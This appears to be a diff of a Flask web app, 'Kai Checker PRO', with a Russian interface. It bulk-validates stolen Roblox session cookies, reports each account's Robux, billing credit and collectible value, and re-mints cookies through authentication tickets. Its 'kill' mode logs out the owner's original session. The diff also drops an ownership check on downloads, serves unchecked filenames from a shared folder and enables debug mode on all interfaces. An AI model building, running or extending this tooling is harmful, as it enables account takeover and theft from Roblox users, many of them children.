+    var blob = await res.blob();
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url; a.download = 'accounts_reports.zip';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+}
 
 function setFresherMode(m) {
     document.getElementById('fresherMode').value = m;
-    document.getElementById('btnDup').style.background = m === 'duplicate' ? 'var(--gradient-btn)' : 'var(--input-bg)';
-    document.getElementById('btnDup').style.color = m === 'duplicate' ? '#fff' : 'var(--text-muted)';
-    document.getElementById('btnKill').style.background = m === 'kill' ? 'var(--gradient-btn)' : 'var(--input-bg)';
-    document.getElementById('btnKill').style.color = m === 'kill' ? '#fff' : 'var(--text-muted)';
+    document.getElementById('btnDup').classList.toggle('active-mode', m === 'duplicate');
+    document.getElementById('btnKill').classList.toggle('active-mode', m === 'kill');
 }
 
 async function runFresher() {
-    const cookies = document.getElementById('fresherCookies').value.trim();
-    const mode = document.getElementById('fresherMode').value;
+    var cookies = document.getElementById('fresherCookies').value.trim();
+    var mode = document.getElementById('fresherMode').value;
     if(!cookies) return showAlert('Вставьте куки!');
+    document.getElementById('fresherContainer').style.display = 'block';
     document.getElementById('fresherResult').style.display = 'block';
+    document.getElementById('btnToggle_fresherResult').textContent = '▼ Свернуть';
     document.getElementById('fresherResult').textContent = '⏳ Обновление...';
-    const res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies, mode}) });
-    const data = await res.json();
+    var res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies: cookies, mode: mode}) });
+    var data = await res.json();
     document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
 }
 
 async function loadCheckerHistory() {
-    const res = await fetch('/api/history/checker');
-    const data = await res.json();
-    let html = '';
-    data.history.slice().reverse().forEach((i, idx) => {
-        const resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
-        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
-        const boxId = 'chk_hist_' + idx;
-        html += `<div style="background:var(--input-bg);padding:12px;border-radius:12px;margin-bottom:10px"><div style="display:flex;justify-content:space-between">🕒 ${i.timestamp} (${i.type}) — Валид: ${i.valid}/${i.total}<button onclick="downloadTxtFromBox('${boxId}','checker_${i.timestamp}.txt')">📥</button></div><div class="history-users">👤 ${usernames}</div><div class="result-box" id="${boxId}" style="display:none;margin-top:6px">${resultsText}</div></div>`;
+    var res = await fetch('/api/history/checker');
+    var data = await res.json();
+    var html = '';
+    data.history.slice().reverse().forEach(function(i, idx) {
+        var resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
+        var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
+        var boxId = 'chk_hist_' + idx;
+        var fileName = 'checker_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
+        html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + (i.type === 'single' ? 'Одиночная' : 'Массовая') + ') — Валид: ' + i.valid + '/' + i.total + '</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + resultsText + '</div></div>';
     });
     document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
 }
 
 async function loadFresherHistory() {
-    const res = await fetch('/api/history/fresher');
-    const data = await res.json();
-    let html = '';
-    data.history.slice().reverse().forEach((i, idx) => {
-        const cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
-        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
-        const boxId = 'frs_hist_' + idx;
-        html += `<div style="background:var(--input-bg);padding:12px;border-radius:12px;margin-bottom:10px"><div style="display:flex;justify-content:space-between">🕒 ${i.timestamp} — Обновлено: ${i.refreshed_count} шт.<button onclick="downloadTxtFromBox('${boxId}','fresher_${i.timestamp}.txt')">📥</button></div><div class="history-users">👤 ${usernames}</div><div class="result-box" id="${boxId}" style="display:none;margin-top:6px">${cookiesText}</div></div>`;
+    var res = await fetch('/api/history/fresher');
+    var data = await res.json();
+    var html = '';
+    data.history.slice().reverse().forEach(function(i, idx) {
+        var cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
+        var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
+        var boxId = 'frs_hist_' + idx;
+        var modeTitle = i.mode === 'kill' ? '💀 Убийство' : '♻️ Дублирование';
+        var fileName = 'fresher_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
+        html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + modeTitle + ') — Обновлено: ' + i.refreshed_count + ' шт.</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + cookiesText + '</div></div>';
     });
     document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
 }
 
-async function clearCheckerHistory() { if(!confirm('Очистить?')) return; await fetch('/api/history/checker/clear', {method:'POST'}); loadCheckerHistory(); }
-async function clearFresherHistory() { if(!confirm('Очистить?')) return; await fetch('/api/history/fresher/clear', {method:'POST'}); loadFresherHistory(); }
+async function clearCheckerHistory() {
+    if(!confirm('Очистить историю чекера?')) return;
+    await fetch('/api/history/checker/clear', {method:'POST'});
+    loadCheckerHistory();
+}
+
+async function clearFresherHistory() {
+    if(!confirm('Очистить историю фрешера?')) return;
+    await fetch('/api/history/fresher/clear', {method:'POST'});
+    loadFresherHistory();
+}
 
 async function mergeCookies() {
-    const files = document.getElementById('mergeFiles').files;
+    var files = document.getElementById('mergeFiles').files;
     if(files.length < 2) return showAlert('Выберите минимум 2 TXT файла!');
-    const fd = new FormData();
-    Array.from(files).forEach(f => fd.append('files', f));
-    const box = document.getElementById('mergeResult');
+    var fd = new FormData();
+    Array.from(files).forEach(function(f) { fd.append('files', f); });
+    var box = document.getElementById('mergeResult');
     box.style.display = 'block';
     box.textContent = '⏳ Объединение...';
-    const res = await fetch('/api/merge-cookies', {method:'POST', body:fd});
-    const data = await res.json();
-    if(data.success) box.innerHTML = '✅ Успешно! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
-    else box.textContent = '❌ Ошибка';
+    var res = await fetch('/api/merge-cookies', {method:'POST', body:fd});
+    var data = await res.json();
+    if(data.success) {
+        box.innerHTML = '✅ Успешно! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
+    } else {
+        box.textContent = '❌ Ошибка';
+    }
 }
 
 async function splitCookies() {
-    const files = document.getElementById('splitFiles').files;
-    const textInput = document.getElementById('splitInput').value;
-    const perFile = parseInt(document.getElementById('splitCount').value) || 1;
+    var files = document.getElementById('splitFiles').files;
+    var textInput = document.getElementById('splitInput').value;
+    var perFile = parseInt(document.getElementById('splitCount').value) || 1;
     if(!files.length && !textInput.trim()) return showAlert('Загрузите файл или вставьте куки!');
-    const fd = new FormData();
-    Array.from(files).forEach(f => fd.append('files', f));
+    var fd = new FormData();
+    Array.from(files).forEach(function(f) { fd.append('files', f); });
     fd.append('text', textInput);
     fd.append('per_file', perFile);
-    const box = document.getElementById('splitResult');
+    var box = document.getElementById('splitResult');
     box.style.display = 'block';
     box.textContent = '⏳ Разделение...';
-    const res = await fetch('/api/split-cookies', {method:'POST', body:fd});
-    const data = await res.json();
-    if(data.success) box.innerHTML = '✅ Разделено на ' + data.total_files + ' файлов! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📦 Скачать ZIP</a>';
-    else box.textContent = data.message || '❌ Ошибка';
+    var res = await fetch('/api/split-cookies', {method:'POST', body:fd});
+    var data = await res.json();
+    if(data.success) {
+        box.innerHTML = '✅ Разделено на ' + data.total_files + ' файлов! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📦 Скачать ZIP</a>';
+    } else {
+        box.textContent = data.message || '❌ Ошибка';
+    }
 }
 
 async function cleanCookies() {
-    const content = document.getElementById('cleanInput').value;
+    var content = document.getElementById('cleanInput').value;
     if(!content.trim()) return showAlert('Вставьте куки!');
-    const box = document.getElementById('cleanResult');
+    var box = document.getElementById('cleanResult');
     box.style.display = 'block';
     box.textContent = '⏳ Очистка...';
-    const res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content})});
-    const data = await res.json();
-    if(data.success) box.innerHTML = '✅ Уникальных: ' + data.count + ' шт. <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
-    else box.textContent = '❌ Ошибка';
+    var res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content: content})});
+    var data = await res.json();
+    if(data.success) {
+        box.innerHTML = '✅ Уникальных: ' + data.count + ' шт. <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
+    } else {
+        box.textContent = '❌ Ошибка';
+    }
 }
-
-function downloadTxtFromBox(boxId, defaultFilename) {
-    const box = document.getElementById(boxId);
-    if (!box || !box.textContent.trim()) return showAlert('Нет данных!');
-    const blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = defaultFilename;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-}
-
-window.onload = function() {
-    activateTab('checker');
-    loadCheckerHistory();
-    loadFresherHistory();
-};
 </script>
-</body></html>"""
+</body>
+</html>"""
 
-# ==========================================
-# API МАРШРУТЫ
-# ==========================================
-@app.route("/")
+# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ИСТОРИИ ====================
+def read_json_file(path):
+    if not os.path.exists(path):
+        return []
+    try:
+        with open(path, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except Exception:
+        return []
+
+def write_json_file(path, data):
+    try:
+        with open(path, 'w', encoding='utf-8') as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"Ошибка записи {path}: {e}")
+
+def save_checker_history_entry(entry_type, valid, total, usernames, results):
+    history = read_json_file(CHECKER_HISTORY_FILE)
+    history.append({
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "type": entry_type,
+        "valid": valid,
+        "total": total,
+        "usernames": usernames,
+        "results": results
+    })
+    write_json_file(CHECKER_HISTORY_FILE, history)
+
+def save_fresher_history_entry(mode, refreshed_count, usernames, cookies):
+    history = read_json_file(FRESHER_HISTORY_FILE)
+    history.append({
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "mode": mode,
+        "refreshed_count": refreshed_count,
+        "usernames": usernames,
+        "cookies": cookies
+    })
+    write_json_file(FRESHER_HISTORY_FILE, history)
+
+# ==================== ЛОГИКА ПРОВЕРКИ ROBLOX ====================
+def clean_cookie(cookie_str):
+    cookie_str = cookie_str.strip()
+    if "_|WARNING:-DO-NOT-SHARE-THIS." in cookie_str:
+        match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"\s]+)', cookie_str)
+        if match:
+            return match.group(1)
+    return cookie_str
+
+def get_account_data(cookie):
+    cookie = clean_cookie(cookie)
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
+    
+    # 1. User Info
+    res_user = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
+    if res_user.status_code != 200:
+        return None
+    user_data = res_user.json()
+    user_id = user_data.get("id")
+    username = user_data.get("name")
+    display_name = user_data.get("displayName")
+    
+    # 2. Robux
+    robux = 0
+    res_robux = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
+    if res_robux.status_code == 200:
+        robux = res_robux.json().get("robux", 0)
+        
+    # 3. Premium & Created
+    is_premium = False
+    created_date = "N/A"
+    res_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers)
+    if res_details.status_code == 200:
+        dt = res_details.json()
+        is_premium = dt.get("isPremium", False)
+        created_str = dt.get("created", "")
+        if created_str:
+            created_date = created_str.split("T")[0]
+            
+    # 4. RAP
+    rap = 0
+    res_rap = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers)
+    if res_rap.status_code == 200:
+        data = res_rap.json().get("data", [])
+        rap = sum(item.get("recentAveragePrice", 0) for item in data)
+        
+    # 5. Summary Stats (Pending, Credit)
+    pending_robux = 0
+    res_pend = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary", headers=headers)
+    if res_pend.status_code == 200:
+        pending_robux = res_pend.json().get("pendingRobuxTotal", 0)
+        
+    credit = "0.00"
+    res_cred = requests.get("https://billing.roblox.com/v1/credit", headers=headers)
+    if res_cred.status_code == 200:
+        credit = f"{res_cred.json().get('balance', 0):.2f}"
+        
+    return {
+        "user_id": user_id,
+        "username": username,
+        "display_name": display_name,
+        "robux": robux,
+        "pending_robux": pending_robux,
+        "credit": credit,
+        "is_premium": is_premium,
+        "created_date": created_date,
+        "rap": rap,
+        "cookie": cookie
+    }
+
+def format_single_report(info):
+    if not info:
+        return "❌ Невалидный кук или ошибка запроса"
+    
+    prem_str = "Да" if info["is_premium"] else "Нет"
+    
+    report = f"""========================================
+👤 АККАУНТ: {info['username']} ({info['display_name']})
+========================================
+🆔 ID: {info['user_id']}
+📅 Дата регистрации: {info['created_date']}
+⭐ Premium: {prem_str}
+💵 Robux: {info['robux']:,}
+⏳ Pending Robux: {info['pending_robux']:,}
+💳 Баланс / Credit: ${info['credit']}
+💎 RAP (Коллекционка): {info['rap']:,}
+========================================
+🍪 Кук:
+{info['cookie']}
+========================================"""
+    return report
+
+def refresh_cookie_action(cookie, mode="duplicate"):
+    cookie = clean_cookie(cookie)
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
+    
+    # 1. Получаем CSRF Токен
+    res = requests.post("https://auth.roblox.com/v1/login", headers=headers)
+    csrf_token = res.headers.get("x-csrf-token")
+    if not csrf_token:
+        return None
+    
+    headers["X-CSRF-TOKEN"] = csrf_token
+    
+    # 2. Вызываем перевыпуск
+    res_refresh = requests.post("https://auth.roblox.com/v1/authentication-ticket", headers=headers)
+    ticket = res_refresh.headers.get("rbx-authentication-ticket")
+    if not ticket:
+        return None
+        
+    res_new = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
+                            json={"authenticationTicket": ticket}, 
+                            headers={"User-Agent": "Mozilla/5.0"})
+    
+    new_cookie = None
+    for c in res_new.cookies:
+        if c.name == ".ROBLOSECURITY":
+            new_cookie = c.value
+            break
+            
+    if not new_cookie:
+        return None
+        
+    if mode == "kill":
+        requests.post("https://auth.roblox.com/v1/logout", headers=headers)
+        
+    return new_cookie
+
+# ==================== ЭНДПОИНТЫ API ====================
+@app.route('/')
 def index():
-    get_user_session_id()
     return render_template_string(HTML)
 
-@app.route("/api/single-check", methods=["POST"])
-def api_single_check():
+@app.route('/api/single-check', methods=['POST'])
+def single_check():
     data = request.json or {}
-    cookie = data.get("cookie", "").strip()
-    if not cookie:
-        return jsonify({"success": False, "message": "Кук не предоставлен"})
-    info = get_full_info(cookie)
-    report = format_full_report(info)
-    add_checker_history({
-        'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0,
-        'usernames': [info['Username']] if info['status']=='✅' else ['Unauthed'],
-        'results': [report],
-        'full_reports': [{'username': info['Username'], 'user_id': info['UserID'], 'report': report}]
-    })
-    return jsonify({"success": True, "report": report})
+    cookie = data.get('cookie', '')
+    info = get_account_data(cookie)
+    if info:
+        rep = format_single_report(info)
+        save_checker_history_entry("single", 1, 1, [info['username']], [rep])
+        return jsonify({"report": rep, "valid": True})
+    return jsonify({"report": "❌ Невалидный кук", "valid": False})
 
-@app.route("/api/mass-check-ws", methods=["POST"])
-def api_mass_check_ws():
-    content = ""
-    if 'file' in request.files:
-        content = request.files['file'].read().decode('utf-8', errors='ignore')
-    
-    cookies = extract_cookies_from_text(content)
+@app.route('/api/mass-check-ws', methods=['POST'])
+def mass_check_ws():
+    file = request.files.get('file')
+    if not file:
+        return jsonify({"success": False, "message": "Файл не предоставлен"})
+        
+    content = file.read().decode('utf-8', errors='ignore')
+    cookies = [line.strip() for line in content.splitlines() if line.strip()]
     if not cookies:
-        return jsonify({"success": False, "message": "Куки не найдены"})
-    
-    start_time = time.time()
-    
-    def run_check():
+        return jsonify({"success": False, "message": "Файл пуст"})
+        
+    def run_process():
         total = len(cookies)
         valid_count = 0
-        premium_count = 0
         total_robux = 0
-        all_results = []
-        full_reports = []
+        premium_count = 0
+        
         usernames = []
+        full_reports = []
         
-        for i, cookie in enumerate(cookies):
-            result = quick_validate(cookie)
-            all_results.append(result)
+        with ThreadPoolExecutor(max_workers=30) as executor:
+            future_to_cookie = {executor.submit(get_account_data, c): c for c in cookies}
+            completed = 0
             
-            if result['status'] == '✅':
-                valid_count += 1
-                if result.get('is_premium'):
-                    premium_count += 1
-                total_robux += result.get('robux', 0)
-                usernames.append(result.get('username', '?'))
+            for future in as_completed(future_to_cookie):
+                completed += 1
+                info = future.result()
+                rep = None
                 
-                if result.get('full_info'):
-                    full_reports.append({
-                        'username': result.get('username', '?'),
-                        'user_id': result.get('user_id', '?'),
-                        'report': format_full_report(result['full_info'])
-                    })
-            
-            status_text = f"[{i+1}/{total}] ✅ {result.get('username', '?')} — {result.get('robux', 0)} R$" if result['status'] == '✅' else f"[{i+1}/{total}] ❌ НЕВАЛИД"
-            
-            socketio.emit('mass_progress', {
-                'current': i + 1,
-                'total': total,
-                'result': status_text,
-                'full_report': None
-            })
-            
-            time.sleep(0.05)
-        
-        total_time = int(time.time() - start_time)
-        summary = generate_summary_report(all_results, total_time)
-        
-        add_checker_history({
-            'type': 'mass', 'total': total, 'valid': valid_count,
-            'usernames': usernames,
-            'results': [summary],
-            'full_reports': full_reports
-        })
+                if info:
+                    valid_count += 1
+                    total_robux += info["robux"]
+                    if info["is_premium"]:
+                        premium_count += 1
+                    usernames.append(info["username"])
+                    rep = format_single_report(info)
+                    full_reports.append(rep)
+                    
+                socketio.emit('mass_progress', {
+                    "current": completed,
+                    "total": total,
+                    "result": rep if info else None,
+                    "full_report": rep if info else None
+                })
+                
+        # Сводный отчёт
+        summary = f"""========================================
+🚀 МАССОВАЯ ПРОВЕРКА ЗАВЕРШЕНА
+========================================
+📊 Статистика:
+- Всего проверено: {total}
+- Валидных аккаунтов: {valid_count}
+- Всего Robux: {total_robux:,}
+- Premium аккаунтов: {premium_count}
+========================================
+
+""" + "\n\n".join(full_reports)
+
+        save_checker_history_entry("mass", valid_count, total, usernames, full_reports)
         
         socketio.emit('mass_complete', {
-            'message': summary,
-            'valid_count': valid_count,
-            'premium_count': premium_count,
-            'total_robux': total_robux
+            "message": summary,
+            "valid_count": valid_count,
+            "total_robux": total_robux,
+            "premium_count": premium_count
         })
-    
-    import threading
-    threading.Thread(target=run_check, daemon=True).start()
-    
+
+    eventlet.spawn(run_process)
     return jsonify({"success": True})
 
-@app.route("/api/download-zip", methods=["POST"])
-def api_download_zip():
+@app.route('/api/download-zip', methods=['POST'])
+def download_zip():
     data = request.json or {}
-    reports = data.get("reports", [])
-    if not reports:
-        return jsonify({"success": False, "message": "Нет отчетов"})
+    reports = data.get('reports', [])
     
-    zip_buffer = io.BytesIO()
-    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
-        for r in reports:
-            fname = f"{r.get('username','user')}_{r.get('user_id','id')}.txt"
-            zf.writestr(fname, r.get('report',''))
-    
-    zip_buffer.seek(0)
-    return send_file(zip_buffer, mimetype="application/zip", as_attachment=True, download_name="roblox_accounts.zip")
+    memory_file = io.BytesIO()
+    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for idx, rep in enumerate(reports, 1):
+            match = re.search(r'👤 АККАУНТ:\s*([^\n\r]+)', rep)
+            uname = match.group(1).split('(')[0].strip() if match else f"acc_{idx}"
+            zf.writestr(f"{uname}.txt", rep)
+            
+    memory_file.seek(0)
+    return send_file(memory_file, download_name="accounts_reports.zip", as_attachment=True)
 
-@app.route("/api/fresher", methods=["POST"])
-def api_fresher():
+@app.route('/api/fresher', methods=['POST'])
+def run_fresher_api():
     data = request.json or {}
-    raw = data.get("cookies", "")
-    mode = data.get("mode", "duplicate")
-    cookies_list = extract_cookies_from_text(raw)
-    if not cookies_list:
-        return jsonify({"success": False, "message": "Куки не найдены"})
+    cookies_raw = data.get('cookies', '')
+    mode = data.get('mode', 'duplicate')
     
-    only_cookies = []
+    cookies = [c.strip() for c in cookies_raw.splitlines() if c.strip()]
+    if not cookies:
+        return jsonify({"only_cookies": "Ошибка: Пустой ввод"})
+        
+    refreshed = []
     usernames = []
+    
     with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = [executor.submit(refresh_roblox_cookie, c, mode=='kill') for c in cookies_list]
+        futures = [executor.submit(refresh_cookie_action, c, mode) for c in cookies]
         for f in as_completed(futures):
             res = f.result()
-            if res['success'] and res['new_cookie']:
-                only_cookies.append(res['new_cookie'])
-                usernames.append(res.get('username','?'))
-    
-    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'usernames': usernames, 'cookies': only_cookies})
-    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})
+            if res:
+                refreshed.append(res)
+                info = get_account_data(res)
+                if info:
+                    usernames.append(info['username'])
+                    
+    save_fresher_history_entry(mode, len(refreshed), usernames, refreshed)
+    return jsonify({"only_cookies": "\n".join(refreshed)})
 
-@app.route("/api/history/checker")
-def api_history_checker():
-    return jsonify({"history": get_checker_history()})
+# ==================== ИСТОРИЯ ====================
+@app.route('/api/history/checker', methods=['GET'])
+def get_checker_history():
+    return jsonify({"history": read_json_file(CHECKER_HISTORY_FILE)})
 
-@app.route("/api/history/fresher")
-def api_history_fresher():
-    return jsonify({"history": get_fresher_history()})
+@app.route('/api/history/fresher', methods=['GET'])
+def get_fresher_history():
+    return jsonify({"history": read_json_file(FRESHER_HISTORY_FILE)})
 
-@app.route("/api/history/checker/clear", methods=["POST"])
-def api_clear_checker_history():
-    clear_checker_history()
+@app.route('/api/history/checker/clear', methods=['POST'])
+def clear_checker_history():
+    write_json_file(CHECKER_HISTORY_FILE, [])
     return jsonify({"success": True})
 
-@app.route("/api/history/fresher/clear", methods=["POST"])
-def api_clear_fresher_history():
-    clear_fresher_history()
+@app.route('/api/history/fresher/clear', methods=['POST'])
+def clear_fresher_history():
+    write_json_file(FRESHER_HISTORY_FILE, [])
     return jsonify({"success": True})
 
-@app.route("/api/merge-cookies", methods=["POST"])
-def api_merge_cookies():
+# ==================== ИНСТРУМЕНТЫ ====================
+@app.route('/api/merge-cookies', methods=['POST'])
+def merge_cookies():
     files = request.files.getlist('files')
-    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
-    merged = merge_cookie_files(contents)
-    
-    user_dir, sid = get_user_download_dir()
-    filename = f"merged_{int(time.time())}.txt"
-    filepath = os.path.join(user_dir, filename)
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(merged)
-    
-    return jsonify({"success": True, "download_url": f"/downloads/{sid}/{filename}"})
+    merged = set()
+    for f in files:
+        lines = f.read().decode('utf-8', errors='ignore').splitlines()
+        for l in lines:
+            c = clean_cookie(l)
+            if c:
+                merged.add(c)
+                
+    content = "\n".join(merged)
+    os.makedirs("downloads", exist_ok=True)
+    out_path = os.path.join("downloads", "merged.txt")
+    with open(out_path, "w", encoding="utf-8") as out:
+        out.write(content)
+        
+    return jsonify({"success": True, "download_url": "/downloads/merged.txt"})
 
-@app.route("/api/split-cookies", methods=["POST"])
-def api_split_cookies():
+@app.route('/api/split-cookies', methods=['POST'])
+def split_cookies():
     files = request.files.getlist('files')
-    text_input = request.form.get('text', '')
+    text = request.form.get('text', '')
     per_file = int(request.form.get('per_file', 1))
-
-    all_contents = [f.read().decode('utf-8', errors='ignore') for f in files]
-    if text_input:
-        all_contents.append(text_input)
-
-    cookies = extract_cookies_from_text('\n'.join(all_contents))
+    
+    cookies = []
+    if files:
+        for f in files:
+            lines = f.read().decode('utf-8', errors='ignore').splitlines()
+            for l in lines:
+                c = clean_cookie(l)
+                if c: cookies.append(c)
+    if text:
+        for l in text.splitlines():
+            c = clean_cookie(l)
+            if c: cookies.append(c)
+            
     if not cookies:
-        return jsonify({"success": False, "message": "Валидные куки для разделения не найдены"})
-
+        return jsonify({"success": False, "message": "Нет куков для разделения"})
+        
     chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
     
-    user_dir, sid = get_user_download_dir()
-    zip_filename = f"splitted_cookies_{int(time.time())}.zip"
-    zip_filepath = os.path.join(user_dir, zip_filename)
-
-    with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
+    os.makedirs("downloads", exist_ok=True)
+    zip_path = os.path.join("downloads", "split_cookies.zip")
+    
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
         for idx, chunk in enumerate(chunks, 1):
-            file_data = '\n'.join(chunk)
-            zf.writestr(f"cookies_part_{idx}.txt", file_data)
+            zf.writestr(f"cookies_part_{idx}.txt", "\n".join(chunk))
+            
+    return jsonify({"success": True, "total_files": len(chunks), "download_url": "/downloads/split_cookies.zip"})
 
-    return jsonify({
-        "success": True,
-        "total_files": len(chunks),
-        "download_url": f"/downloads/{sid}/{zip_filename}"
-    })
-
-@app.route("/api/clean-cookies", methods=["POST"])
-def api_clean_cookies():
+@app.route('/api/clean-cookies', methods=['POST'])
+def clean_cookies():
     data = request.json or {}
-    processed = remove_duplicates(data.get("content", ""))
-    
-    user_dir, sid = get_user_download_dir()
-    filename = f"cleaned_{int(time.time())}.txt"
-    filepath = os.path.join(user_dir, filename)
-    
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(processed)
-    count = len([line for line in processed.split('\n') if line.strip()])
-    return jsonify({"success": True, "count": count, "download_url": f"/downloads/{sid}/{filename}"})
+    content = data.get('content', '')
+    lines = content.splitlines()
+    unique = set()
+    for l in lines:
+        c = clean_cookie(l)
+        if c:
+            unique.add(c)
+            
+    os.makedirs("downloads", exist_ok=True)
+    out_path = os.path.join("downloads", "cleaned.txt")
+    with open(out_path, "w", encoding="utf-8") as out:
+        out.write("\n".join(unique))
+        
+    return jsonify({"success": True, "count": len(unique), "download_url": "/downloads/cleaned.txt"})
 
-@app.route("/downloads/<sid>/<filename>")
-def download_file(sid, filename):
-    user_sid = get_user_session_id()
-    if sid != user_sid:
-        return jsonify({"error": "Forbidden"}), 403
-    return send_from_directory(os.path.join("downloads", sid), filename, as_attachment=True)
+@app.route('/downloads/<filename>')
+def download_file(filename):
+    return send_file(os.path.join("downloads", filename), as_attachment=True)
 
-# ==========================================
-# ТОЧКА ВХОДА
-# ==========================================
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    socketio.run(app, host="0.0.0.0", port=port, debug=False)
+if __name__ == '__main__':
+    print("🚀 Kai Checker PRO запущен на http://localhost:5000")
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
